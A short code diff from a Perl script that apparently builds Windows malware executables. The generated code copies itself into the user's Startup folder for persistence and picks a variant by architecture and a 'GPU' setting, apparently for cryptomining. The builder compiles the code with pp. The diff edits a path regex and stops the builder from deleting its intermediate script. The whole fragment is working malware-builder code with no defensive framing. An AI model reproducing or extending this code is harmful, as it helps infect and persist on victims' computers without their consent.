@@ -83,7 +83,7 @@ for(glob "C:\\\\Users\\\\\$username\\\\AppData\\\\Roaming\\\\*"){
   }
 }
 while(\$ok != 1){
-  \$0 =~ s/(.*?)\\(.*?)//g;
+  \$0 =~ s/(.*?)\\\\(.*?)//g;
   system("copy \$0 %AppData%\\Microsoft\\Windows\\\"Start Menu\\"\\Programs\\Startup");
   if(\$Config{archname} =~ /x86_64/i || \$Config{archname} =~ /x64/i){
     if("$x86_or_x64" =~ /GPU/i){
@@ -119,7 +119,7 @@ while(1){
 EXE
 		  close(EXECUTABLE);
 		  system("pp -o $executable_name executable.pl");
-		  unlink "executable.pl";
+		  #unlink "executable.pl";
 		  print color("RED"),"\n[*]",color("reset"), " Sucesso !\n";
 		}
 	  }
